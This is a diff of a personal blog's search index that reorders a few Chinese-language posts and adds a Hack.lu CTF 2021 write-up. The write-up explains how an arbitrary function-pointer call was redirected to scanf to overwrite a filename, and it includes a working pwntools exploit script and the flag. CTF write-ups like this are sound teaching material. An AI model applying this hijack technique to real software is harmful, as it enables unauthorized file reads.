@@ -24,15 +24,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Is it useful?</title>
-    <url>/2018/09/29/2018-09-29-02-05-47/</url>
-    <content><![CDATA[<p>#Why?<br>Why even learn to code? People have been communication big ideas for centuries <em>without</em> needing to learn a new language. <br><br>What do you think?</p>
-]]></content>
-      <categories>
-        <category>系统默认</category>
-      </categories>
-  </entry>
-  <entry>
     <title>图片呀</title>
     <url>/2018/09/29/2018-09-29-11-25-22/</url>
     <content><![CDATA[<p>##图片图片！</p>
@@ -52,6 +43,24 @@
       </categories>
   </entry>
   <entry>
+    <title>Is it useful?</title>
+    <url>/2018/09/29/2018-09-29-02-05-47/</url>
+    <content><![CDATA[<p>#Why?<br>Why even learn to code? People have been communication big ideas for centuries <em>without</em> needing to learn a new language. <br><br>What do you think?</p>
+]]></content>
+      <categories>
+        <category>系统默认</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>新功能上线，文件分享</title>
+    <url>/2018/11/27/2018-11-27-20-57-44/</url>
+    <content><![CDATA[<p>最新功能，文件分享。做的时候感觉有一堆用处，结果写完之后发现没啥屁用处。<br><br><img src="https://i.loli.net/2018/11/27/5bfd3ee93e8c4.png" alt="演示"><br>测试地址：<a href="https://lxgshadow.us/files/detail?id=1">https://lxgshadow.us/files/detail?id=1</a></p>
+]]></content>
+      <categories>
+        <category>SiteDev</category>
+      </categories>
+  </entry>
+  <entry>
     <title>新的小工具--quizlet单词获取器</title>
     <url>/2018/10/21/2018-10-21-00-21-20/</url>
     <content><![CDATA[<p>#quizlet单词获取器<br><del>感觉博客空荡荡的，所以发一个</del><br><br><del>反正没人看</del><br><br>就是一个小工具，输入地址，然后就把单词和意思跳出来。可以做单词表用，其他没什么用处emmmmm。<br><br>感觉还真没什么用处。。。。<br><br><em>谁会来用这个啊喂</em><br><br>还是放点图出来吧。。。<br><br>输入链接<br><br><img src="https://i.loli.net/2018/10/21/5bcb54c734014.png" alt="输入链接"><br>获取成功<br><br><img src="https://i.loli.net/2018/10/21/5bcb54c6e3346.png" alt="获取成功"><br>随机生成<br><br><img src="https://i.loli.net/2018/10/21/5bcb54c726d72.png" alt="随机生成"></p>
@@ -68,15 +77,6 @@
 <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=450 src="//music.163.com/outchain/player?type=0&id=2230227224&auto=1&height=430"></iframe>]]></content>
       <categories>
         <category>Life</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>新功能上线，文件分享</title>
-    <url>/2018/11/27/2018-11-27-20-57-44/</url>
-    <content><![CDATA[<p>最新功能，文件分享。做的时候感觉有一堆用处，结果写完之后发现没啥屁用处。<br><br><img src="https://i.loli.net/2018/11/27/5bfd3ee93e8c4.png" alt="演示"><br>测试地址：<a href="https://lxgshadow.us/files/detail?id=1">https://lxgshadow.us/files/detail?id=1</a></p>
-]]></content>
-      <categories>
-        <category>SiteDev</category>
       </categories>
   </entry>
   <entry>
@@ -1788,6 +1788,42 @@ https://www.bsfdvbsbilibili.com
         <tag>pwn</tag>
         <tag>ductf</tag>
         <tag>ret2libc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【Hack.lu CTF 2021】secure prototype 【pwn】</title>
+    <url>/2021/10/31/hacker-lu-2021-secure-prototype/</url>
+    <content><![CDATA[<h1 id="0x1-introduction"><a href="#0x1-introduction" class="headerlink" title="0x1 introduction"></a>0x1 introduction</h1><p><a href="https://flu.xxx/challenges/16">https://flu.xxx/challenges/16</a></p>
+<h1 id="0x3-Mitigations"><a href="#0x3-Mitigations" class="headerlink" title="0x3 Mitigations"></a>0x3 Mitigations</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     arm-32-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    Canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x3-Solution"><a href="#0x3-Solution" class="headerlink" title="0x3 Solution"></a>0x3 Solution</h1><p>challenge contains 3 file, challenge.elf, stonks.txt, flag.txt</p>
+<p>using decompiler and take a deep look at functions.</p>
+<span id="more"></span>
+
+<p><img src="/2021/10/31/hacker-lu-2021-secure-prototype/2021-10-31_151419.jpg" alt="2021-10-31_151419.jpg"></p>
+<p>after enter the correct command and enter three variable, it will jump to function at 108e0, 108e0 contains a switch that call different function depending on the command user enter.</p>
+<p><img src="/2021/10/31/hacker-lu-2021-secure-prototype/2021-10-31_151832.jpg" alt="2021-10-31_151832.jpg"></p>
+<p>notice that string “stonks.txt” are stored in the <code>byte_22058</code>, and with commmand <em>48</em>, function <code>sub_10B80</code> will read <code>byte_22058</code> as a filename, and print out whether in the file.</p>
+<p>so, we got an idea that if we need get the flag, we need to change <code>byte_22058</code> to “flag.txt” instead of “stonks.txt”</p>
+<p>looking at other commands, command <em>1056</em> allow us pass a integer as a pointer to an function (lets say <strong>funcA</strong>).</p>
+<p>and with command <em>4619</em>, we have call <strong>funcA</strong> with our 1st and 2nd parameter.</p>
+<p>so, here is the question. Is there any function that take 2 pointer parameter and can modify a string. </p>
+<p>the answer is <code>plt:00010570 __isoc99_scanf</code>, we can use <code>scanf(&quot;%s&quot;,char* str)</code> to read input from stdin and write str.</p>
+<p>in this case, str is the address of <code>byte_22058</code>, and “%s” can also found in the data section.</p>
+<p>therefore, we have the process of getting the flag.</p>
+<ol>
+<li>use 1056: change function address to scanf</li>
+<li>use 4619: call scanf and write flag.txt to byte_22058</li>
+<li>use 48: print out the file content in filename(byte_22058)</li>
+</ol>
+<h1 id="0x4-exp-py"><a href="#0x4-exp-py" class="headerlink" title="0x4 exp.py"></a>0x4 exp.py</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template &#x27;--host=flu.xxx&#x27; &#x27;--port=20040&#x27; challenge.elf</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;challenge.elf&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;flu.xxx&#x27;</span><br><span class="line">port = int(args.PORT or 20040)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak *0x&#123;exe.entry:x&#125;</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     arm-32-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    Canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x10000)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">print(1,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;1056&quot;)</span><br><span class="line">print(2,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;66928 0 0&quot;)</span><br><span class="line">print(3,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;4919&quot;)</span><br><span class="line">print(4,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;70140 139352 0&quot;)</span><br><span class="line">io.sendline(b&quot;flag.txt\x00&quot;)</span><br><span class="line">print(5,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;48&quot;)</span><br><span class="line">print(6,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;123 456 789&quot;)</span><br><span class="line">print(io.recv())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&quot;%%s&quot;,0x111fc)</span><br><span class="line">print(&quot;22058&quot;,0x0022058)</span><br><span class="line">print(&quot;scanf&quot;,0x00010570)</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x5-flag"><a href="#0x5-flag" class="headerlink" title="0x5 flag"></a>0x5 flag</h1><p>flag{gl0bal_st0nkz_and_gl0bal_var1abl3}</p>
+]]></content>
+      <tags>
+        <tag>writeup</tag>
+        <tag>ctf</tag>
+        <tag>hack.lu</tag>
       </tags>
   </entry>
   <entry>
